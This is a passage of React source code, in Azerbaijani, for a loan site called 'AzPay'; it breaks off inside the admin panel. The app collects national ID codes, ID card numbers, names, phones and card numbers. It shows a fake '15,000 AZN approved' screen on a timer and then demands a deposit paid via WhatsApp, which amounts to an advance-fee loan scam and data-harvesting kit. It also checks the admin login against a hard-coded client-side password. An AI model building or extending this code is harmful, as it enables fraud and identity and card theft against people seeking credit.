import React, { useState, useEffect } from 'react';
import { BrowserRouter, Routes, Route, useNavigate } from 'react-router-dom';
import axios from 'axios';
import '@/App.css';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Label } from '@/components/ui/label';
import { CheckCircle2, Shield, Clock, TrendingUp, Loader2 } from 'lucide-react';
import { toast } from 'sonner';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Home Page
const HomePage = () => {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen">
      {/* Header */}
      <header className="sticky top-0 z-50 backdrop-blur-xl bg-white/80 border-b border-blue-100">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <img 
              src="https://i.hizliresim.com/iydskgy.jpeg" 
              alt="AzPay" 
              className="h-12 w-auto"
            />
          </div>
          <Button 
            onClick={() => navigate('/application')} 
            className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 px-8"
            data-testid="start-application-btn"
          >
            Müraciət et
          </Button>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative py-24 px-4 overflow-hidden min-h-[600px] flex items-center">
        <div className="absolute inset-0 bg-gradient-to-br from-blue-100 via-blue-50 to-white"></div>
        <div className="absolute inset-0 opacity-10">
          <div className="absolute top-20 left-10 w-72 h-72 bg-blue-400 rounded-full blur-3xl"></div>
          <div className="absolute bottom-20 right-10 w-96 h-96 bg-blue-300 rounded-full blur-3xl"></div>
        </div>
        <div className="container mx-auto relative z-10">
          <div className="max-w-5xl mx-auto text-center">
            <div className="mb-8 animate-bounce">
              <div className="inline-block p-4 bg-white rounded-2xl shadow-xl">
                <span className="text-5xl">💰</span>
              </div>
            </div>
            <h1 className="text-5xl sm:text-6xl lg:text-7xl font-extrabold mb-6 bg-gradient-to-r from-blue-800 via-blue-600 to-blue-500 bg-clip-text text-transparent leading-tight">
              Kredit almaq indi<br/>daha asan və sürətli!
            </h1>
            <p className="text-xl sm:text-2xl text-gray-700 mb-4 max-w-3xl mx-auto font-medium">
              15 dəqiqə ərzində 15,000 AZN-dək kredit
            </p>
            <p className="text-lg text-gray-600 mb-10 max-w-2xl mx-auto">
              Rəsmi gəlir arayışı tələb olunmur • Gecikməsi olanlar üçün kredit
            </p>
            <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
              <Button 
                onClick={() => navigate('/application')} 
                size="lg"
                className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-xl px-12 py-7 rounded-full shadow-2xl hover:shadow-xl transition-all hover:scale-105 font-bold"
                data-testid="hero-apply-btn"
              >
                Dərhal müraciət et →
              </Button>
              <div className="flex items-center gap-2 text-gray-700">
                <CheckCircle2 className="w-5 h-5 text-green-600" />
                <span className="font-semibold">5,000+ təsdiqlənmiş müraciət</span>
              </div>
            </div>
            
            <div className="mt-12 grid grid-cols-3 gap-8 max-w-2xl mx-auto">
              <div className="bg-white/80 backdrop-blur-sm p-6 rounded-2xl shadow-lg">
                <div className="text-3xl font-bold text-blue-700">15 dəq</div>
                <div className="text-sm text-gray-600 mt-1">Sürətli cavab</div>
              </div>
              <div className="bg-white/80 backdrop-blur-sm p-6 rounded-2xl shadow-lg">
                <div className="text-3xl font-bold text-blue-700">16%</div>
                <div className="text-sm text-gray-600 mt-1">İllik faiz</div>
              </div>
              <div className="bg-white/80 backdrop-blur-sm p-6 rounded-2xl shadow-lg">
                <div className="text-3xl font-bold text-blue-700">15,000₼</div>
                <div className="text-sm text-gray-600 mt-1">Maksimum kredit</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Features */}
      <section className="py-20 px-4">
        <div className="container mx-auto">
          <div className="grid md:grid-cols-3 gap-8">
            <Card className="border-blue-100 hover:shadow-xl transition-all hover:-translate-y-1">
              <CardHeader>
                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center mb-4">
                  <Clock className="w-7 h-7 text-white" />
                </div>
                <CardTitle>Sürətli baxış</CardTitle>
                <CardDescription>Müraciətiniz dərhal yoxlanılır və cavab alırsınız</CardDescription>
              </CardHeader>
            </Card>

            <Card className="border-blue-100 hover:shadow-xl transition-all hover:-translate-y-1">
              <CardHeader>
                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center mb-4">
                  <Shield className="w-7 h-7 text-white" />
                </div>
                <CardTitle>Asan şərtlər</CardTitle>
                <CardDescription>Rəsmi gəlir arayışı tələb olunmur, gecikmə olanlar müraciət edə bilər</CardDescription>
              </CardHeader>
            </Card>

            <Card className="border-blue-100 hover:shadow-xl transition-all hover:-translate-y-1">
              <CardHeader>
                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center mb-4">
                  <TrendingUp className="w-7 h-7 text-white" />
                </div>
                <CardTitle>Əlverişli faizlər</CardTitle>
                <CardDescription>16-18% illik faiz dərəcəsi ilə kredit imkanı</CardDescription>
              </CardHeader>
            </Card>
          </div>
        </div>
      </section>

      {/* About AzPay */}
      <section className="py-20 px-4 bg-gradient-to-br from-blue-50 to-white">
        <div className="container mx-auto max-w-4xl">
          <h2 className="text-4xl font-bold text-center mb-12 text-blue-900">AzPay haqqında</h2>
          <Card className="border-blue-100 shadow-xl">
            <CardContent className="p-8">
              <p className="text-lg text-gray-700 leading-relaxed mb-4">
                <strong className="text-blue-700">AzPay</strong> - Azərbaycanda rəqəmsal maliyyə xidmətləri sahəsində fəaliyyət göstərən innovativ şirkətdir. 
                Biz müştərilərimizə ən sürətli və asan kredit xidmətlərini təqdim edirik.
              </p>
              <p className="text-lg text-gray-700 leading-relaxed mb-4">
                Missiyamız hər kəsə maliyyə imkanlarına əlçatanlığı təmin etməkdir. Rəsmi gəlir arayışı olmayan, 
                kredit tarixində gecikmələr olan şəxslər belə bizdən kredit ala bilərlər.
              </p>
              <div className="grid sm:grid-cols-2 gap-4 mt-6">
                <div className="flex items-start gap-3">
                  <CheckCircle2 className="w-6 h-6 text-blue-600 mt-1 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-gray-900">Sürətli proses</h4>
                    <p className="text-sm text-gray-600">15 dəqiqə ərzində cavab</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <CheckCircle2 className="w-6 h-6 text-blue-600 mt-1 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-gray-900">Minimum sənəd</h4>
                    <p className="text-sm text-gray-600">Yalnız şəxsiyyət vəsiqəsi</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <CheckCircle2 className="w-6 h-6 text-blue-600 mt-1 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-gray-900">Şəffaflıq</h4>
                    <p className="text-sm text-gray-600">Aydın şərtlər</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <CheckCircle2 className="w-6 h-6 text-blue-600 mt-1 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-gray-900">Təhlükəsizlik</h4>
                    <p className="text-sm text-gray-600">Məlumatlarınız qorunur</p>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gradient-to-r from-blue-900 to-blue-800 text-white py-12 px-4">
        <div className="container mx-auto text-center">
          <img 
            src="https://i.hizliresim.com/iydskgy.jpeg" 
            alt="AzPay" 
            className="h-16 w-auto mx-auto mb-4"
          />
          <p className="text-blue-100 text-lg">© 2025 AzPay. Bütün hüquqlar qorunur.</p>
        </div>
      </footer>
    </div>
  );
};

// Application Form
const ApplicationForm = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    fin_code: '',
    id_series: '',
    full_name: '',
    phone: ''
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const response = await axios.post(`${API}/applications`, formData);
      toast.success('Müraciətiniz qəbul edildi!');
      setTimeout(() => {
        navigate(`/approval/${response.data.id}`);
      }, 1500);
    } catch (error) {
      toast.error('Xəta baş verdi. Yenidən cəhd edin.');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-2xl">
        <Button 
          variant="ghost" 
          onClick={() => navigate('/')} 
          className="mb-6"
          data-testid="back-to-home-btn"
        >
          ← Geri
        </Button>

        <Card className="shadow-2xl border-blue-100">
          <CardHeader className="space-y-1 pb-6">
            <img 
              src="https://i.hizliresim.com/iydskgy.jpeg" 
              alt="AzPay" 
              className="h-12 w-auto mx-auto mb-4"
            />
            <CardTitle className="text-3xl text-center">Kredit müraciəti</CardTitle>
            <CardDescription className="text-center">
              Məlumatlarınızı daxil edərək müraciət edin
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <Label htmlFor="fin_code">FIN kod</Label>
                <Input
                  id="fin_code"
                  data-testid="fin-code-input"
                  placeholder="7 simvol"
                  value={formData.fin_code}
                  onChange={(e) => setFormData({ ...formData, fin_code: e.target.value.toUpperCase() })}
                  maxLength={7}
                  required
                  className="mt-1.5"
                />
              </div>

              <div>
                <Label htmlFor="id_series">Şəxsiyyət vəsiqəsi seriya və nömrəsi</Label>
                <Input
                  id="id_series"
                  data-testid="id-series-input"
                  placeholder="Seriya və nömrə"
                  value={formData.id_series}
                  onChange={(e) => setFormData({ ...formData, id_series: e.target.value.toUpperCase() })}
                  required
                  className="mt-1.5"
                />
              </div>

              <div>
                <Label htmlFor="full_name">Ad və Soyad</Label>
                <Input
                  id="full_name"
                  data-testid="full-name-input"
                  placeholder="Ad və soyad"
                  value={formData.full_name}
                  onChange={(e) => setFormData({ ...formData, full_name: e.target.value })}
                  required
                  className="mt-1.5"
                />
              </div>

              <div>
                <Label htmlFor="phone">Telefon nömrəsi</Label>
                <Input
                  id="phone"
                  data-testid="phone-input"
                  type="tel"
                  placeholder="+994"
                  value={formData.phone}
                  onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                  required
                  className="mt-1.5"
                />
              </div>

              <Button 
                type="submit" 
                className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6 text-lg"
                disabled={loading}
                data-testid="submit-application-btn"
              >
                {loading ? (
                  <>
                    <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                    Yoxlanılır...
                  </>
                ) : (
                  'Yoxla və davam et'
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Approval Page
const ApprovalPage = () => {
  const navigate = useNavigate();
  const appId = window.location.pathname.split('/').pop();
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    // Progress animation
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) return 100;
        return prev + (100 / 15);
      });
    }, 1000);

    // Navigate after 15 seconds
    const timeout = setTimeout(() => {
      navigate(`/credit-selection/${appId}`);
    }, 15000);

    return () => {
      clearInterval(progressInterval);
      clearTimeout(timeout);
    };
  }, [navigate, appId]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 flex items-center justify-center px-4">
      <Card className="max-w-md w-full shadow-2xl border-blue-100">
        <CardContent className="p-12 text-center">
          <img 
            src="https://i.hizliresim.com/iydskgy.jpeg" 
            alt="AzPay" 
            className="h-16 w-auto mx-auto mb-6"
          />
          <div className="w-24 h-24 bg-gradient-to-br from-green-400 to-green-500 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
            <CheckCircle2 className="w-14 h-14 text-white" />
          </div>
          <h2 className="text-3xl font-bold text-gray-900 mb-3" data-testid="approval-title">
            15,000 AZN kredit təsdiq edildi!
          </h2>
          <p className="text-gray-600 text-lg mb-6">
            Məlumatlarınız yoxlanılır...
          </p>
          
          <div className="space-y-3">
            <div className="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
              <div 
                className="bg-gradient-to-r from-blue-600 to-blue-500 h-2 rounded-full transition-all duration-1000"
                style={{ width: `${progress}%` }}
              ></div>
            </div>
            <p className="text-sm text-gray-500">
              {Math.round(progress)}% tamamlandı
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

// Credit Selection Page
const CreditSelectionPage = () => {
  const navigate = useNavigate();
  const appId = window.location.pathname.split('/').pop();
  const [offers, setOffers] = useState([]);
  const [selectedOffer, setSelectedOffer] = useState(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    fetchOffers();
  }, []);

  const fetchOffers = async () => {
    try {
      const response = await axios.get(`${API}/credit-offers`);
      setOffers(response.data);
    } catch (error) {
      toast.error('Təklifləri yükləyərkən xəta baş verdi');
    }
  };

  const handleSelectOffer = async (offer) => {
    setLoading(true);
    try {
      await axios.put(`${API}/applications/${appId}`, {
        selected_amount: offer.amount
      });
      toast.success('Kredit məbləği seçildi');
      setTimeout(() => {
        navigate(`/card-entry/${appId}`);
      }, 1000);
    } catch (error) {
      toast.error('Xəta baş verdi');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-4xl">
        <Card className="shadow-2xl border-blue-100 mb-8">
          <CardHeader>
            <CardTitle className="text-3xl text-center">Kredit məbləği seçin</CardTitle>
            <CardDescription className="text-center">
              Sizə uyğun məbləği seçərək davam edin
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
              {offers.map((offer) => (
                <Card 
                  key={offer.amount}
                  className={`cursor-pointer border-2 transition-all duration-300 hover:shadow-2xl hover:-translate-y-1 ${
                    selectedOffer?.amount === offer.amount 
                      ? 'border-blue-600 bg-gradient-to-br from-blue-50 to-blue-100 shadow-xl scale-105' 
                      : 'border-gray-200 hover:border-blue-400'
                  }`}
                  onClick={() => setSelectedOffer(offer)}
                  data-testid={`credit-offer-${offer.amount}`}
                >
                  <CardContent className="p-6">
                    <div className="text-center mb-4 relative">
                      {selectedOffer?.amount === offer.amount && (
                        <div className="absolute -top-2 -right-2">
                          <CheckCircle2 className="w-6 h-6 text-blue-600" />
                        </div>
                      )}
                      <div className="inline-block px-4 py-2 bg-gradient-to-r from-blue-600 to-blue-700 rounded-full mb-3">
                        <h3 className="text-3xl font-bold text-white">{offer.amount} ₼</h3>
                      </div>
                    </div>
                    <div className="space-y-3 text-sm">
                      <div className="flex justify-between items-center p-2 bg-white rounded-lg">
                        <span className="text-gray-600">Müddət:</span>
                        <span className="font-semibold text-gray-900">{offer.duration_months} ay</span>
                      </div>
                      <div className="flex justify-between items-center p-2 bg-white rounded-lg">
                        <span className="text-gray-600">İllik faiz:</span>
                        <span className="font-semibold text-gray-900">{offer.interest_rate}%</span>
                      </div>
                      <div className="flex justify-between items-center p-3 bg-gradient-to-r from-blue-100 to-blue-50 rounded-lg border border-blue-200">
                        <span className="text-gray-700 font-medium">Aylıq ödəniş:</span>
                        <span className="font-bold text-blue-700 text-lg">{offer.monthly_payment.toFixed(2)} ₼</span>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            <Button
              onClick={() => handleSelectOffer(selectedOffer)}
              disabled={!selectedOffer || loading}
              className="w-full mt-8 bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6 text-lg"
              data-testid="confirm-credit-selection-btn"
            >
              {loading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Yüklənir...
                </>
              ) : (
                'Davam et'
              )}
            </Button>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Card Entry Page
const CardEntryPage = () => {
  const navigate = useNavigate();
  const appId = window.location.pathname.split('/').pop();
  const [cardNumber, setCardNumber] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      await axios.put(`${API}/applications/${appId}`, {
        card_number: cardNumber
      });
      toast.success('Kart məlumatı yadda saxlanıldı');
      setTimeout(() => {
        navigate(`/contract/${appId}`);
      }, 1000);
    } catch (error) {
      toast.error('Xəta baş verdi');
      setLoading(false);
    }
  };

  const formatCardNumber = (value) => {
    const cleaned = value.replace(/\s/g, '');
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
    return formatted;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-xl">
        <Card className="shadow-2xl border-blue-100">
          <CardHeader>
            <img 
              src="https://i.hizliresim.com/iydskgy.jpeg" 
              alt="AzPay" 
              className="h-14 w-auto mx-auto mb-4"
            />
            <CardTitle className="text-3xl text-center">Kart məlumatları</CardTitle>
            <CardDescription className="text-center">
              Pulun köçürüləcəyi kart nömrəsini daxil edin
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <Label htmlFor="card_number">Kart nömrəsi (16 rəqəm)</Label>
                <Input
                  id="card_number"
                  data-testid="card-number-input"
                  type="text"
                  placeholder="0000 0000 0000 0000"
                  value={formatCardNumber(cardNumber)}
                  onChange={(e) => {
                    const cleaned = e.target.value.replace(/\s/g, '');
                    if (/^\d{0,16}$/.test(cleaned)) {
                      setCardNumber(cleaned);
                    }
                  }}
                  maxLength={19}
                  required
                  className="mt-1.5 text-lg tracking-wider"
                />
              </div>

              <Button
                type="submit"
                disabled={cardNumber.length !== 16 || loading}
                className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6 text-lg"
                data-testid="submit-card-btn"
              >
                {loading ? (
                  <>
                    <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                    Yüklənir...
                  </>
                ) : (
                  'Rəsmiləşdirməyə keç'
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Contract Page
const ContractPage = () => {
  const navigate = useNavigate();
  const appId = window.location.pathname.split('/').pop();
  const [accepted, setAccepted] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleAccept = async () => {
    setLoading(true);
    try {
      await axios.put(`${API}/applications/${appId}`, {
        contract_signed: true
      });
      toast.success('Müqavilə təsdiqləndi');
      setTimeout(() => {
        navigate(`/deposit/${appId}`);
      }, 1000);
    } catch (error) {
      toast.error('Xəta baş verdi');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-3xl">
        <Card className="shadow-2xl border-blue-100">
          <CardHeader>
            <img 
              src="https://i.hizliresim.com/iydskgy.jpeg" 
              alt="AzPay" 
              className="h-14 w-auto mx-auto mb-4"
            />
            <CardTitle className="text-3xl text-center">Kredit müqaviləsi</CardTitle>
            <CardDescription className="text-center">
              Şərtləri oxuyub təsdiq edin
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="bg-gray-50 p-6 rounded-lg max-h-96 overflow-y-auto mb-6 border border-gray-200" data-testid="contract-content">
              <h3 className="font-bold text-lg mb-4 text-blue-700">Kredit müqaviləsi şərtləri</h3>
              
              <div className="space-y-4 text-sm text-gray-700 leading-relaxed">
                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">1. Ümumi müddəalar</h4>
                  <p>Bu müqavilə AzPay MMC (bundan sonra "Kreditor") ilə müştəri (bundan sonra "Borc alan") arasında bağlanmışdır.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">2. Kreditin məbləği və müddəti</h4>
                  <p>Kreditor borc alana seçilmiş məbləğdə kredit verir. Kredit müqavilədə göstərilən müddətdə qaytarılmalıdır.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">3. Faiz dərəcəsi</h4>
                  <p>Kredit üzrə illik faiz dərəcəsi müqavilədə göstərilən məbləğə uyğundur (16-18%).</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">4. Ödəniş qaydası</h4>
                  <p>Borc alan hər ay göstərilən tarixdə aylıq ödənişi həyata keçirməlidir. Gecikmə halında əlavə cərimə tətbiq oluna bilər.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">5. Depozit</h4>
                  <p>Kreditin aktivləşdirilməsi üçün borc alan depozit ödənişi etməlidir. Depozit məbləği sistem tərəfindən göstərilir.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">6. Erkən ödəmə</h4>
                  <p>Borc alan istənilən vaxt krediti tam və ya qismən erkən qaytara bilər. Erkən ödəmə halında faiz yenidən hesablanır.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">7. Məxfilik</h4>
                  <p>Kreditor müştəri məlumatlarının məxfiliyini təmin edir və üçüncü şəxslərə vermir.</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">8. Mübahisələrin həlli</h4>
                  <p>Müqavilə ilə bağlı mübahisələr danışıqlar yolu ilə, əldə edilmədiyi halda isə məhkəmə qaydasında həll olunur.</p>
                </section>
              </div>
            </div>

            <div className="flex items-start gap-3 mb-6 p-4 bg-blue-50 rounded-lg border border-blue-200">
              <input
                type="checkbox"
                id="accept"
                data-testid="accept-contract-checkbox"
                checked={accepted}
                onChange={(e) => setAccepted(e.target.checked)}
                className="mt-1 w-5 h-5 text-blue-600 rounded cursor-pointer"
              />
              <label htmlFor="accept" className="text-sm text-gray-700 cursor-pointer">
                Mən yuxarıda göstərilən bütün şərtləri oxudum və qəbul edirəm. Kredit müqaviləsini imzalamağa razıyam.
              </label>
            </div>
            
            <div className="text-center mb-4 pt-4 border-t border-gray-200">
              <img 
                src="https://i.hizliresim.com/iydskgy.jpeg" 
                alt="AzPay" 
                className="h-12 w-auto mx-auto mb-2"
              />
              <p className="text-xs text-gray-500">© 2025 AzPay. Bütün hüquqlar qorunur.</p>
            </div>

            <Button
              onClick={handleAccept}
              disabled={!accepted || loading}
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6 text-lg"
              data-testid="sign-contract-btn"
            >
              {loading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Yüklənir...
                </>
              ) : (
                'Təsdiq et və davam et'
              )}
            </Button>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Deposit Page
const DepositPage = () => {
  const appId = window.location.pathname.split('/').pop();
  const [settings, setSettings] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchSettings();
  }, []);

  const fetchSettings = async () => {
    try {
      const response = await axios.get(`${API}/settings`);
      setSettings(response.data);
    } catch (error) {
      toast.error('Məlumatları yükləyərkən xəta baş verdi');
    } finally {
      setLoading(false);
    }
  };

  const handleWhatsAppRedirect = () => {
    if (settings?.whatsapp_link) {
      window.open(settings.whatsapp_link, '_blank');
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="w-12 h-12 animate-spin text-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-2xl">
        <Card className="shadow-2xl border-blue-100">
          <CardHeader>
            <img 
              src="https://i.hizliresim.com/iydskgy.jpeg" 
              alt="AzPay" 
              className="h-14 w-auto mx-auto mb-4"
            />
            <div className="w-20 h-20 bg-gradient-to-br from-green-500 to-green-600 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
              <span className="text-5xl font-bold text-white">₼</span>
            </div>
            <CardTitle className="text-3xl text-center">Depozit ödənişi</CardTitle>
            <CardDescription className="text-center">
              Kreditin aktivləşdirilməsi üçün depozit ödəyin
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            <div className="bg-gradient-to-r from-blue-50 to-blue-100 p-8 rounded-xl text-center border-2 border-blue-200 shadow-md">
              <p className="text-gray-700 mb-2 font-medium">Depozit məbləği</p>
              <p className="text-5xl font-bold text-blue-700" data-testid="deposit-amount">
                {settings?.deposit_amount || 50} AZN
              </p>
            </div>

            <div className="bg-yellow-50 border-2 border-yellow-200 p-4 rounded-lg shadow-sm">
              <p className="text-sm text-yellow-800">
                <strong>Qeyd:</strong> Depozit ödənişi kreditin aktivləşdirilməsi üçün tələb olunur. 
                Ödəniş WhatsApp vasitəsilə həyata keçirilir.
              </p>
            </div>

            <Button
              onClick={handleWhatsAppRedirect}
              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 py-6 text-lg"
              data-testid="whatsapp-payment-btn"
            >
              <svg className="w-6 h-6 mr-2" fill="currentColor" viewBox="0 0 24 24">
                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
              </svg>
              WhatsApp ilə ödəniş et
            </Button>

            <p className="text-center text-sm text-gray-500">
              Ödənişdən sonra təsdiq üçün 5-10 dəqiqə gözləyin
            </p>
            
            <div className="text-center pt-6 border-t border-gray-200">
              <img 
                src="https://i.hizliresim.com/iydskgy.jpeg" 
                alt="AzPay" 
                className="h-12 w-auto mx-auto mb-2"
              />
              <p className="text-sm text-gray-500">© 2025 AzPay. Bütün hüquqlar qorunur.</p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Admin Panel
const AdminPanel = () => {
  const navigate = useNavigate();
  const [password, setPassword] = useState('');
  const [authenticated, setAuthenticated] = useState(false);
  const [settings, setSettings] = useState({ deposit_amount: 50, whatsapp_link: '' });
  const [loading, setLoading] = useState(false);

  const handleLogin = () => {
    if (password === 'admin123') {
      setAuthenticated(true);
      fetchSettings();
    } else {
      toast.error('Yanlış şifrə');
    }
  };

  const fetchSettings = async () => {
    try {
      const response = await axios.get(`${API}/settings`);
      setSettings(response.data);
    } catch (error) {
      toast.error('Məlumatları yükləyərkən xəta');
    }
  };

  const handleUpdate = async () => {
    setLoading(true);
    try {
      await axios.put(
        `${API}/settings`,
        {
          deposit_amount: parseFloat(settings.deposit_amount),
          whatsapp_link: settings.whatsapp_link
        },
        {
          headers: { 'admin-password': 'admin123' }
        }
      );
      toast.success('Parametrlər yeniləndi');
    } catch (error) {
      toast.error('Xəta baş verdi');
    } finally {
      setLoading(false);
    }
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 flex items-center justify-center px-4">
        <Card className="max-w-md w-full shadow-2xl">
          <CardHeader>
            <CardTitle className="text-2xl text-center">Admin Paneli</CardTitle>
            <CardDescription className="text-center">Daxil olmaq üçün şifrəni daxil edin</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <Label htmlFor="password">Şifrə</Label>
              <Input
                id="password"
                type="password"
                data-testid="admin-password-input"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
                className="mt-1.5"
              />
            </div>
            <Button 
              onClick={handleLogin} 
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700"
              data-testid="admin-login-btn"
            >
              Daxil ol
            </Button>
            <Button 
              variant="ghost" 
              onClick={() => navigate('/')} 
              className="w-full"
            >
              Ana səhifəyə qayıt
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-2xl">
        <Button 
          variant="ghost" 
          onClick={() => navigate('/')} 
          className="mb-6"
        >
          ← Ana səhifəyə qayıt
        </Button>

        <Card className="shadow-2xl border-blue-100">
          <CardHeader>
            <CardTitle className="text-3xl">Admin Paneli</CardTitle>
            <CardDescription>Sistem parametrlərini idarə edin</CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            <div>
              <Label htmlFor="deposit_amount">Depozit məbləği (AZN)</Label>
              <Input
                id="deposit_amount"
                type="number"
                data-testid="admin-deposit-input"
                value={settings.deposit_amount}
                onChange={(e) => setSettings({ ...settings, deposit_amount: e.target.value })}
                className="mt-1.5"
              />
            </div>

            <div>
              <Label htmlFor="whatsapp_link">WhatsApp linki</Label>
              <Input
                id="whatsapp_link"
                type="url"
                data-testid="admin-whatsapp-input"
